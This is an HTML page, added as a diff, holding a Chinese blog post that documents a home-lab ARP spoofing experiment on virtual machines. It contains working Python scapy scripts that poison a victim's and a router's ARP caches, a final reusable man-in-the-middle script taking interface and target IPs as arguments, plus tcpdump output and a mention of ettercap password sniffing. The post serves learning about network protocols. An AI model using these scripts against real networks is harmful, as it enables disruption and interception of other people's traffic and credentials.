@@ -1,0 +1,472 @@
+<!DOCTYPE html>
+<html lang="zh_CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    hostname: new URL('https://staight.github.io').hostname,
+    root: '/',
+    scheme: 'Mist',
+    version: '7.7.0',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},
+    copycode: {"enable":true,"show_result":true,"style":"mac"},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    comments: {"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: '',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}
+  };
+</script>
+
+  <meta name="description" content="鉴于之前看过了ARP协议的原理,这次来测试一下ARP欺骗.在如何发送数据包方面,貌似基于python的scapy包是一个很nice的选择 实验下面我们来测试一下arp欺骗相关内容">
+<meta property="og:type" content="article">
+<meta property="og:title" content="arp欺骗">
+<meta property="og:url" content="https://staight.github.io/2018/09/01/arp%E6%AC%BA%E9%AA%97/index.html">
+<meta property="og:site_name" content="staight">
+<meta property="og:description" content="鉴于之前看过了ARP协议的原理,这次来测试一下ARP欺骗.在如何发送数据包方面,貌似基于python的scapy包是一个很nice的选择 实验下面我们来测试一下arp欺骗相关内容">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2018-09-01T01:36:28.000Z">
+<meta property="article:modified_time" content="2019-10-02T17:49:50.000Z">
+<meta property="article:author" content="staight">
+<meta property="article:tag" content="网络">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://staight.github.io/2018/09/01/arp%E6%AC%BA%E9%AA%97/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true
+  };
+</script>
+
+  <title>arp欺骗 | staight</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">staight</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-杂物">
+
+    <a href="/sundries/" rel="section"><i class="fa fa-fw fa-calendar"></i>杂物</a>
+
+  </li>
+  </ul>
+
+</nav>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+  <a href="https://github.com/staight" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh_CN">
+    <link itemprop="mainEntityOfPage" href="https://staight.github.io/2018/09/01/arp%E6%AC%BA%E9%AA%97/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="staight">
+      <meta itemprop="description" content="keep it simple and stupid">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="staight">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          arp欺骗
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2018-09-01 09:36:28" itemprop="dateCreated datePublished" datetime="2018-09-01T09:36:28+08:00">2018-09-01</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2019-10-03 01:49:50" itemprop="dateModified" datetime="2019-10-03T01:49:50+08:00">2019-10-03</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>鉴于之前看过了ARP协议的原理,这次来测试一下ARP欺骗.在如何发送数据包方面,貌似基于python的<code>scapy</code>包是一个很nice的选择</p>
+<h2 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h2><p>下面我们来测试一下arp欺骗相关内容</p>
+<p>环境:</p>
+<p>test1:192.168.122.11,52:54:00:95:07:90,被欺骗主机<br>test2:192.168.122.12,52:54:00:02:3a:3d,欺骗主机<br>router:192.168.122.1,52:54:00:6d:32:18,路由器</p>
+<h3 id="单主机arp欺骗"><a href="#单主机arp欺骗" class="headerlink" title="单主机arp欺骗"></a>单主机arp欺骗</h3><p>首先试试看test2能不能向test1发送免费arp,让test1以为test2才是路由器,并使之无法上网</p>
+<p>这里test2发送的arp包的目标IP与目标MAC都是test1的,源MAC是自己,唯独源IP改为了路由器的IP</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> (</span><br><span class="line">    Ether,</span><br><span class="line">    ARP,</span><br><span class="line">    sendp</span><br><span class="line">)</span><br><span class="line"><span class="comment"># Ether用来构建以太网数据包</span></span><br><span class="line"><span class="comment"># ARP是构建ARP数据包的类</span></span><br><span class="line"><span class="comment"># sendp方法在第二层发送数据包</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Ether用来构建以太网数据包</span></span><br><span class="line">eth = Ether()</span><br><span class="line">arp = ARP(</span><br><span class="line">    <span class="comment"># 代表ARP请求或者响应</span></span><br><span class="line">    op=<span class="string">"is-at"</span>,</span><br><span class="line">    <span class="comment"># 发送方Mac地址/毒化记录中的MAC</span></span><br><span class="line">    hwsrc=<span class="string">"52:54:00:02:3a:3d"</span>,</span><br><span class="line">    <span class="comment"># 发送方IP地址/毒化记录中的IP</span></span><br><span class="line">    psrc=<span class="string">"192.168.122.1"</span>,</span><br><span class="line">    <span class="comment"># 目标Mac地址/被欺骗主机MAC</span></span><br><span class="line">    hwdst=<span class="string">"52:54:00:95:07:90"</span>,</span><br><span class="line">    <span class="comment"># 目标IP地址/被欺骗主机IP地址</span></span><br><span class="line">    pdst=<span class="string">"192.168.122.11"</span></span><br><span class="line">)</span><br><span class="line"><span class="comment"># scapy重载了"/"操作符，可以用来表示两个协议层的组合</span></span><br><span class="line"><span class="comment"># 这里我们输出一下数据包的结构信息</span></span><br><span class="line">print((eth/arp).show())</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送封包，并且每间隔1秒重复发送</span></span><br><span class="line">sendp(eth/arp, inter=<span class="number">2</span>, loop=<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
+<p>该脚本一执行,与test1的ssh连接就中断了…test1现在处于只能局域网通信的状态,因为外网的数据包全都发送到test2上</p>
+<p>查看test1的arp表:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">192.168.122.1 dev eth0 lladdr 52:54:00:02:3a:3d REACHABLE</span><br><span class="line">192.168.122.12 dev eth0 lladdr 52:54:00:02:3a:3d STALE</span><br></pre></td></tr></table></figure>
+
+<p>可以看到test1认为test2和路由器的mac地址相同,试验成功!</p>
+<h3 id="数据包截获"><a href="#数据包截获" class="headerlink" title="数据包截获"></a>数据包截获</h3><p>光是让一个主机无法通信就太简单了,arp欺骗一般来说是用来截获数据包获取有价值的信息的</p>
+<p>为了达成这个目的,我们所需要做的是:</p>
+<ol>
+<li>欺骗test1,使之认为test2是路由器</li>
+<li>欺骗路由器,使之认为test2是test1</li>
+<li>转发test1的流量,使之能正常上网</li>
+<li>截获来自test1的流量</li>
+</ol>
+<p>由于test1,test2,router处于同一局域网下,所以无需手动配置路由,只需内核的路由转发功能即可:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@test2 ~]# echo 1 &gt; &#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;ip_forward</span><br></pre></td></tr></table></figure>
+
+<p>接下来创建py脚本,分别对test1和router进行arp欺骗:</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> (</span><br><span class="line">    Ether,</span><br><span class="line">    ARP,</span><br><span class="line">    sendp</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">cheatTest = Ether()/ARP()</span><br><span class="line">cheatTest.op = <span class="string">"is-at"</span></span><br><span class="line">cheatTest.hwsrc = <span class="string">"52:54:00:02:3a:3d"</span></span><br><span class="line">cheatTest.psrc = <span class="string">"192.168.122.1"</span></span><br><span class="line">cheatTest.hwdst = <span class="string">"52:54:00:95:07:90"</span></span><br><span class="line">cheatTest.pdst = <span class="string">"192.168.122.11"</span></span><br><span class="line"></span><br><span class="line">cheatRouter = Ether()/ARP()</span><br><span class="line">cheatRouter.op = <span class="string">"is-at"</span></span><br><span class="line">cheatRouter.hwsrc = <span class="string">"52:54:00:02:3a:3d"</span></span><br><span class="line">cheatRouter.psrc = <span class="string">"192.168.122.11"</span></span><br><span class="line">cheatRouter.hwdst = <span class="string">"52:54:00:6d:32:18"</span></span><br><span class="line">cheatRouter.pdst = <span class="string">"192.168.122.1"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    sendp(cheatTest, inter=<span class="number">1</span>)</span><br><span class="line">    sendp(cheatRouter, inter=<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
+<p>理论上来说test1已经能够正常上网,且数据包都经过test2才对,但现在的情况是test1能局域网通信,却无法访问外网-.-</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[root@test1 ~]# ping 192.168.122.1 -c1</span><br><span class="line">PING 192.168.122.1 (192.168.122.1) 56(84) bytes of data.</span><br><span class="line">64 bytes from 192.168.122.1: icmp_seq&#x3D;1 ttl&#x3D;63 time&#x3D;1.42 ms</span><br><span class="line"></span><br><span class="line">--- 192.168.122.1 ping statistics ---</span><br><span class="line">1 packets transmitted, 1 received, 0% packet loss, time 0ms</span><br><span class="line">rtt min&#x2F;avg&#x2F;max&#x2F;mdev &#x3D; 1.423&#x2F;1.423&#x2F;1.423&#x2F;0.000 ms</span><br><span class="line">[root@test1 ~]# ping baidu.com -c1</span><br><span class="line">PING baidu.com (123.125.115.110) 56(84) bytes of data.</span><br><span class="line"></span><br><span class="line">--- baidu.com ping statistics ---</span><br><span class="line">1 packets transmitted, 0 received, 100% packet loss, time 0ms</span><br></pre></td></tr></table></figure>
+
+<p>由于之前已经在外网测试成功,所以这次虚拟机测试失败也不应该是步骤错误的问题…先抓包试试看:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[root@test2 ~]# tcpdump -nn not port 22 and not arp and not icmp</span><br><span class="line">tcpdump: verbose output suppressed, use -v or -vv for full protocol decode</span><br><span class="line">listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes</span><br><span class="line">15:31:56.500300 IP 192.168.122.11.54881 &gt; 192.168.122.1.53: 38008+ A? baidu.com. (27)</span><br><span class="line">15:31:56.500329 IP 192.168.122.11.54881 &gt; 192.168.122.1.53: 38008+ A? baidu.com. (27)</span><br><span class="line">15:31:56.500361 IP 192.168.122.11.54881 &gt; 192.168.122.1.53: 49739+ AAAA? baidu.com. (27)</span><br><span class="line">15:31:56.500368 IP 192.168.122.11.54881 &gt; 192.168.122.1.53: 49739+ AAAA? baidu.com. (27)</span><br><span class="line">15:31:56.500813 IP 192.168.122.1.53 &gt; 192.168.122.11.54881: 38008 2&#x2F;0&#x2F;0 A 220.181.57.216, A 123.125.115.110 (59)</span><br><span class="line">15:31:56.500827 IP 192.168.122.1.53 &gt; 192.168.122.11.54881: 38008 2&#x2F;0&#x2F;0 A 220.181.57.216, A 123.125.115.110 (59)</span><br><span class="line">15:31:56.500832 IP 192.168.122.1.53 &gt; 192.168.122.11.54881: 49739 0&#x2F;0&#x2F;0 (27)</span><br><span class="line">15:31:56.500838 IP 192.168.122.1.53 &gt; 192.168.122.11.54881: 49739 0&#x2F;0&#x2F;0 (27)</span><br><span class="line">15:31:56.503511 IP 192.168.122.1.43668 &gt; 220.181.57.216.80: Flags [S], seq 1334321456, win 29200, options [mss 1460,sackOK,TS val 1062307 ecr 0,nop,wscale 7], length 0</span><br><span class="line">15:31:56.503538 IP 192.168.122.1.43668 &gt; 220.181.57.216.80: Flags [S], seq 1334321456, win 29200, options [mss 1460,sackOK,TS val 1062307 ecr 0,nop,wscale 7], length 0</span><br><span class="line">15:31:57.504266 IP 192.168.122.1.43668 &gt; 220.181.57.216.80: Flags [S], seq 1334321456, win 29200, options [mss 1460,sackOK,TS val 1063308 ecr 0,nop,wscale 7], length 0</span><br><span class="line">15:31:57.504349 IP 192.168.122.1.43668 &gt; 220.181.57.216.80: Flags [S], seq 1334321456, win 29200, options [mss 1460,sackOK,TS val 1063308 ecr 0,nop,wscale 7], length 0</span><br></pre></td></tr></table></figure>
+
+<p>可以看到test1对dns的请求是成功的,返回了百度的ip地址,但http数据包从router发送至百度服务器后,却再也没有收到服务器的回应,真是奇怪…这个问题暂时放在这,以后再来解决</p>
+<p>正常来说,能够截获数据包就算arp欺骗成功而了,除了最常用的wireshark外,kali上也有一些相关的工具,如<code>ettercap</code>进行密码嗅探,<code>driftnet</code>进行图片嗅探,还有<code>arpspoof</code>进行arp欺骗</p>
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>这次除了进行arp欺骗外,值得注意的还有<code>scapy</code>包,这是一个数据包构造相关的库,使用相当简单.有了这个包,我们就可以对学得的网络知识快速实践</p>
+<p>这是写好的脚本:</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> (</span><br><span class="line">    Ether,</span><br><span class="line">    ARP,</span><br><span class="line">    sendp,</span><br><span class="line">    getmacbyip,</span><br><span class="line">    get_if_hwaddr</span><br><span class="line">)</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">hwaddr = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">arpSpoof</span><span class="params">(test, router)</span>:</span></span><br><span class="line">    testmac = getmacbyip(test)</span><br><span class="line">    routermac = getmacbyip(router)</span><br><span class="line">    cheatTest = Ether()/ARP()</span><br><span class="line">    cheatTest.op = <span class="string">"is-at"</span></span><br><span class="line">    cheatTest.hwsrc = hwaddr</span><br><span class="line">    cheatTest.psrc = router</span><br><span class="line">    cheatTest.hwdst = testmac</span><br><span class="line">    cheatTest.pdst = test</span><br><span class="line"></span><br><span class="line">    cheatRouter = Ether()/ARP()</span><br><span class="line">    cheatRouter.op = <span class="string">"is-at"</span></span><br><span class="line">    cheatRouter.hwsrc = hwaddr</span><br><span class="line">    cheatRouter.psrc = test</span><br><span class="line">    cheatRouter.hwdst = routermac</span><br><span class="line">    cheatRouter.pdst = router</span><br><span class="line"></span><br><span class="line">    testHandler = threading.Thread(target=sendp, args=(</span><br><span class="line">        cheatTest,), kwargs=&#123;<span class="string">"inter"</span>: <span class="number">1</span>, <span class="string">"loop"</span>: <span class="number">1</span>&#125;)</span><br><span class="line">    routerHandler = threading.Thread(target=sendp, args=(</span><br><span class="line">        cheatRouter,), kwargs=&#123;<span class="string">"inter"</span>: <span class="number">1</span>, <span class="string">"loop"</span>: <span class="number">1</span>&#125;)</span><br><span class="line">    testHandler.start()</span><br><span class="line">    routerHandler.start()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> hwaddr</span><br><span class="line">    hwaddr = get_if_hwaddr(sys.argv[<span class="number">1</span>])</span><br><span class="line">    testip = sys.argv[<span class="number">2</span>]</span><br><span class="line">    routerip = sys.argv[<span class="number">3</span>]</span><br><span class="line">    arpSpoof(testip, routerip)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+<h2 id="参考文档-参考了几乎没用"><a href="#参考文档-参考了几乎没用" class="headerlink" title="参考文档(参考了几乎没用-.-)"></a>参考文档(参考了几乎没用-.-)</h2><p><a href="https://www.jianshu.com/p/719ce98b04f5?utm_campaign=maleskine&utm_content=note&utm_medium=seo_notes&utm_source=recommendation" target="_blank" rel="noopener">简书:Python黑帽编程 3.1 ARP欺骗</a></p>
+<p><a href="https://www.jianshu.com/p/63a0b36a0c81" target="_blank" rel="noopener">简书:【原创】使用arpspoof实现内网ARP欺骗</a></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/%E7%BD%91%E7%BB%9C/" rel="tag"><i class="fa fa-tag"></i> 网络</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2018/08/25/Postgres-SQL%E8%AF%AD%E5%8F%A5/" rel="prev" title="Postgres-SQL语句">
+      <i class="fa fa-chevron-left"></i> Postgres-SQL语句
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2018/09/05/%E5%BC%95%E5%AF%BC%E6%80%BB%E7%BB%93/" rel="next" title="引导总结">
+      引导总结 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let activeClass = CONFIG.comments.activeClass;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#实验"><span class="nav-number">1.</span> <span class="nav-text">实验</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#单主机arp欺骗"><span class="nav-number">1.1.</span> <span class="nav-text">单主机arp欺骗</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#数据包截获"><span class="nav-number">1.2.</span> <span class="nav-text">数据包截获</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#小结"><span class="nav-number">2.</span> <span class="nav-text">小结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考文档-参考了几乎没用"><span class="nav-number">3.</span> <span class="nav-text">参考文档(参考了几乎没用-.-)</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="staight"
+      src="/images/avatar.png">
+  <p class="site-author-name" itemprop="name">staight</p>
+  <div class="site-description" itemprop="description">keep it simple and stupid</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">68</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">15</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">staight</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v4.2.0
+  </div>
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">主题 – <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a> v7.7.0
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  
+  <script color='0,255,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
